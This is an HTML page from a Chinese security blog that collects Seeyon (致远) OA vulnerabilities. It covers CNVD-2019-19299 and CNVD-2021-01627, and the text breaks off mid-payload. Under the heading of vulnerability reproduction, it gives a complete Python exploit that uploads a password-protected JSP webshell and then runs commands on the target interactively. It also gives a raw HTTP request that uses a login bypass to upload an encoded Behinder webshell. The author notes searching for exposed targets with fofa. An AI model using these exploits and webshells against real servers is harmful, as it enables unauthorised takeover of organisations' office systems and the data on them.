<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
  </script>

  <meta name="description" content="【CNVD-2019-19299】致远OA A8远程命令执行漏洞漏洞描述致远A8+协同管理软件存在远程命令执行漏洞。攻击者通过上传精心构造的后门文件即可Getshell，获得目标服务器的权限。">
<meta property="og:type" content="article">
<meta property="og:title" content="致远OA漏洞集合">
<meta property="og:url" content="https://leeyuxun.github.io/%E8%87%B4%E8%BF%9COA%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html">
<meta property="og:site_name" content="Leeyuxun の note">
<meta property="og:description" content="【CNVD-2019-19299】致远OA A8远程命令执行漏洞漏洞描述致远A8+协同管理软件存在远程命令执行漏洞。攻击者通过上传精心构造的后门文件即可Getshell，获得目标服务器的权限。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225042.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225303.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225355.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225638.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225757.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225903.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225925.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230101.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230143.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230208.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230249.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230313.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230351.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230424.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230509.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230542.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230632.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230732.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230825.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230907.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230957.png">
<meta property="article:published_time" content="2022-09-12T14:25:23.000Z">
<meta property="article:modified_time" content="2023-05-07T07:37:53.505Z">
<meta property="article:author" content="李钰璕">
<meta property="article:tag" content="漏洞 致远OA">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225042.png">

<link rel="canonical" href="https://leeyuxun.github.io/%E8%87%B4%E8%BF%9COA%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>致远OA漏洞集合 | Leeyuxun の note</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-V3499K2XZY"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-V3499K2XZY');
      }
    </script>


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?4d72a66931dff6410b32974da2e3df61";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Leeyuxun の note</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E8%87%B4%E8%BF%9COA%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="李钰璕">
      <meta itemprop="description" content="安全学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leeyuxun の note">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          致远OA漏洞集合
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-12 22:25:23" itemprop="dateCreated datePublished" datetime="2022-09-12T22:25:23+08:00">2022-09-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-07 15:37:53" itemprop="dateModified" datetime="2023-05-07T15:37:53+08:00">2023-05-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="【CNVD-2019-19299】致远OA-A8远程命令执行漏洞"><a href="#【CNVD-2019-19299】致远OA-A8远程命令执行漏洞" class="headerlink" title="【CNVD-2019-19299】致远OA A8远程命令执行漏洞"></a>【CNVD-2019-19299】致远OA A8远程命令执行漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远A8+协同管理软件存在远程命令执行漏洞。攻击者通过上传精心构造的后门文件即可Getshell，获得目标服务器的权限。</p>
<span id="more"></span>

<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>致远A8-V5协同管理软件V6.1sp1</li>
<li>致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3</li>
<li>致远A8+协同管理软件V7.1</li>
</ul>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问<code>/seeyon/htmlofficeservlet</code>如果出现下图所示的内容，表示存在漏洞。</p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225042.png"></p>
</li>
<li><p>尝试构造POC如下，使用fofa查询很多致远OA，虽然存在<code>/seeyon/htmlofficeservlet</code>，但一直无法写入文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV"</span></span><br><span class="line">payload += <span class="string">"OPTION=S3WYOSWLBSGr"</span></span><br><span class="line">payload += <span class="string">"currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66"</span></span><br><span class="line">payload += <span class="string">"CREATEDATE=wUghPB3szB3Xwg66"</span></span><br><span class="line">payload += <span class="string">"RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6"</span></span><br><span class="line">payload += <span class="string">"originalFileId=wV66"</span></span><br><span class="line">payload += <span class="string">"originalCreateDate=wUghPB3szB3Xwg66"</span></span><br><span class="line">payload += <span class="string">"FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6"</span></span><br><span class="line">payload += <span class="string">"needReadFile=yRWZdAS6"</span></span><br><span class="line">payload += <span class="string">"originalCreateDate=wLSGP4oEzLKAz4=iz=66"</span></span><br><span class="line">payload += <span class="string">"&lt;%@ page language='java' import='java.util.*,java.io.*'' pageEncoding='UTF-8'%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+'\n');}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if('asasd3344'.equals(request.getParameter('pwd'))&amp;&amp;!''.equals(request.getParameter('cmd'))){out.println('&lt;pre&gt;'+excuteCmd(request.getParameter('cmd')) + '&lt;/pre&gt;');}else{out.println(':-)');}%&gt;6e4f045d4b8506bf492ada7e3390d7ce"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">url</span>):</span><br><span class="line">    url1 = url + <span class="string">"/seeyon/htmlofficeservlet"</span></span><br><span class="line">    header = {<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0'</span>,</span><br><span class="line">              <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>, <span class="string">'Content-Length'</span>: <span class="string">'1121'</span>}</span><br><span class="line">    request = requests.post(url1, data=payload, headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url,cmd</span>):</span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">"/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+%s"</span> % cmd</span><br><span class="line"></span><br><span class="line">    request = requests.get(url2)</span><br><span class="line">    response = request.text</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">'&lt;[^&gt;]*&gt;'</span>)</span><br><span class="line">    content = reg.sub(<span class="string">''</span>,response).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"Usage: python A8-OA-seeyon-RCE.py url"</span></span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    post(url)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = raw_input(<span class="string">"Command: "</span>)</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="built_in">print</span> get(url,cmd)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225303.png"></p>
</li>
</ol>
<h2 id="【CNVD-2021-01627】致远OA-ajax-do登录绕过-任意文件上传漏洞"><a href="#【CNVD-2021-01627】致远OA-ajax-do登录绕过-任意文件上传漏洞" class="headerlink" title="【CNVD-2021-01627】致远OA ajax.do登录绕过 任意文件上传漏洞"></a>【CNVD-2021-01627】致远OA ajax.do登录绕过 任意文件上传漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。</p>
<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>致远OA V8.0</p>
<p>致远OA V7.1、V7.1SP1</p>
<p>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</p>
<p>致远OA V6.0、V6.1SP1、V6.1SP2</p>
<p>致远OA V5.x</p>
<p>致远OA G6</p>
<h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问URL<code>/seeyon/thirdpartyController.do.css/..;/ajax.do</code>，出现如下异常则可能存在漏洞</p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225355.png"></p>
</li>
<li><p>然后调用未授权的文件上传接口上传webshell文件，构造POST请求，上传冰蝎马</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3521</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://xxx.xxx.xxx.xxx</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=a2e1cfbb-ae00-422b-8624-383d33226aff; loginPageURL=""</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">managerMethod<span class="operator">=</span>validate&amp;arguments<span class="operator">=</span><span class="variable">%1</span>F<span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%08</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>uTK<span class="variable">%C2</span><span class="variable">%93</span><span class="variable">%C2</span><span class="variable">%A2H</span><span class="variable">%10</span><span class="variable">%3</span>E<span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%BE</span><span class="variable">%0</span>A<span class="variable">%C3</span><span class="variable">%82</span><span class="variable">%C2</span><span class="variable">%8</span>Bv<span class="variable">%C3</span><span class="variable">%B4</span><span class="variable">%C2</span><span class="variable">%8</span>C<span class="variable">%C2</span><span class="variable">%8</span>D+<span class="keyword">c</span><span class="variable">%C2</span><span class="variable">%BB</span><span class="variable">%13</span><span class="variable">%7</span>Bh_<span class="variable">%C2</span><span class="variable">%88</span><span class="variable">%28</span>*<span class="variable">%28</span><span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C2</span><span class="variable">%8</span>D<span class="variable">%3</span>D<span class="variable">%40</span><span class="variable">%15</span>Ba<span class="variable">%15</span><span class="variable">%C2</span><span class="variable">%B0</span><span class="variable">%C3</span><span class="variable">%B2</span><span class="variable">%10</span><span class="variable">%C3</span><span class="variable">%AC</span><span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%C3</span><span class="variable">%BF</span><span class="variable">%C2</span><span class="variable">%BE</span><span class="variable">%05</span><span class="variable">%C3</span><span class="variable">%98</span><span class="variable">%C3</span><span class="variable">%93</span><span class="variable">%3</span>D<span class="variable">%C2</span><span class="variable">%B1</span><span class="variable">%C2</span><span class="variable">%BDu</span><span class="variable">%C2</span><span class="variable">%A9</span><span class="variable">%C3</span><span class="variable">%8</span>C<span class="variable">%C2</span><span class="variable">%AC</span><span class="variable">%C3</span><span class="variable">%8</span>C<span class="variable">%C2</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%B2</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C3</span><span class="variable">%97</span>k<span class="variable">%C3</span><span class="variable">%B7</span><span class="variable">%14</span>_H<span class="variable">%C2</span><span class="variable">%8</span>E<span class="variable">%C2</span><span class="variable">%9</span>DC<span class="variable">%C2</span><span class="variable">%95</span><span class="keyword">x</span><span class="variable">%C3</span><span class="variable">%9</span>D<span class="variable">%3</span>F<span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%C3</span><span class="variable">%81</span><span class="variable">%17</span><span class="variable">%C3</span><span class="variable">%A6M</span><span class="variable">%C2</span><span class="variable">%A28</span><span class="variable">%C2</span><span class="variable">%A4</span><span class="variable">%C2</span><span class="variable">%96</span>t<span class="number">3</span><span class="variable">%2</span>F<span class="variable">%C3</span><span class="variable">%8</span>D<span class="variable">%C2</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%AF</span><span class="variable">%C3</span><span class="variable">%A2y</span><span class="variable">%C2</span><span class="variable">%99</span><span class="variable">%5</span>C<span class="variable">%C2</span><span class="variable">%BC4EqT</span><span class="variable">%3</span>Fj<span class="variable">%C3</span><span class="variable">%99</span><span class="variable">%05</span>E<span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%938</span>Y<span class="variable">%C3</span><span class="variable">%80</span><span class="variable">%C3</span><span class="variable">%BC</span><span class="variable">%C3</span><span class="variable">%89</span>t<span class="variable">%C3</span><span class="variable">%BA</span><span class="variable">%C3</span><span class="variable">%BD</span><span class="variable">%C2</span><span class="variable">%A7</span><span class="variable">%C2</span><span class="variable">%AB</span><span class="variable">%C3</span><span class="variable">%A7</span><span class="variable">%3</span>AI<span class="variable">%C2</span><span class="variable">%92</span><span class="variable">%3</span>E<span class="variable">%C2</span><span class="variable">%A5</span><span class="variable">%C2</span><span class="variable">%9</span>EW<span class="variable">%C3</span><span class="variable">%85</span><span class="variable">%C3</span><span class="variable">%91</span>S<span class="variable">%C3</span><span class="variable">%A7</span><span class="variable">%C3</span><span class="variable">%BB</span><span class="variable">%C3</span><span class="variable">%AFL</span><span class="variable">%7</span>B<span class="variable">%7</span>E<span class="variable">%0</span>B<span class="variable">%C2</span><span class="variable">%9</span>D<span class="variable">%C3</span><span class="variable">%82</span><span class="variable">%C3</span><span class="variable">%A9</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%C2</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%BF</span><span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%26</span><span class="variable">%C2</span><span class="variable">%99</span>qA<span class="variable">%C2</span><span class="variable">%99</span>wa<span class="variable">%C2</span><span class="variable">%92</span>w<span class="variable">%C2</span><span class="variable">%9</span>A<span class="variable">%C2</span><span class="variable">%A3</span><span class="variable">%00</span><span class="variable">%C2</span><span class="variable">%91</span>we<span class="variable">%3</span>EQ<span class="variable">%C3</span><span class="variable">%AB</span><span class="variable">%C3</span><span class="variable">%95</span><span class="variable">%C3</span><span class="variable">%B8</span><span class="variable">%C2</span><span class="variable">%8</span>F<span class="variable">%1</span>D<span class="variable">%C2</span><span class="variable">%AD</span><span class="variable">%C2</span><span class="variable">%81</span><span class="variable">%3</span>C<span class="variable">%26</span><span class="variable">%C3</span><span class="variable">%90</span><span class="variable">%C3</span><span class="variable">%89</span><span class="variable">%C2</span><span class="variable">%BCA</span><span class="variable">%3</span>FL<span class="variable">%C2</span><span class="variable">%93</span><span class="variable">%C2</span><span class="variable">%B2</span><span class="variable">%C3</span><span class="variable">%B3</span><span class="variable">%C3</span><span class="variable">%B0</span><span class="variable">%13</span><span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%BB</span><span class="variable">%C2</span><span class="variable">%92</span><span class="variable">%06</span><span class="variable">%1</span>E<span class="variable">%C3</span><span class="variable">%86</span><span class="variable">%C2</span><span class="variable">%B5</span><span class="variable">%2</span>F<span class="variable">%3</span>B<span class="number">1</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C2</span><span class="variable">%81</span>YR<span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%C3</span><span class="variable">%9</span>C<span class="variable">%C2</span><span class="variable">%98</span><span class="variable">%C2</span><span class="variable">%95</span><span class="variable">%C2</span><span class="variable">%96</span>A<span class="variable">%C3</span><span class="variable">%A6</span><span class="variable">%C2</span><span class="variable">%8</span>A<span class="variable">%C3</span><span class="variable">%82</span>mKj<span class="variable">%19</span><span class="variable">%C2</span><span class="variable">%8</span>B<span class="variable">%C2</span><span class="variable">%9</span>C<span class="variable">%C2</span><span class="variable">%A5</span><span class="variable">%C3</span><span class="variable">%8</span>A<span class="variable">%C2</span><span class="variable">%82</span>Y<span class="variable">%5</span>C<span class="variable">%C2</span><span class="variable">%AC</span><span class="variable">%C2</span><span class="variable">%B9</span><span class="variable">%24</span><span class="variable">%C2</span><span class="variable">%80</span>d<span class="variable">%C2</span><span class="variable">%9</span>E<span class="variable">%03</span><span class="variable">%5</span>E<span class="variable">%C3</span><span class="variable">%8</span>F<span 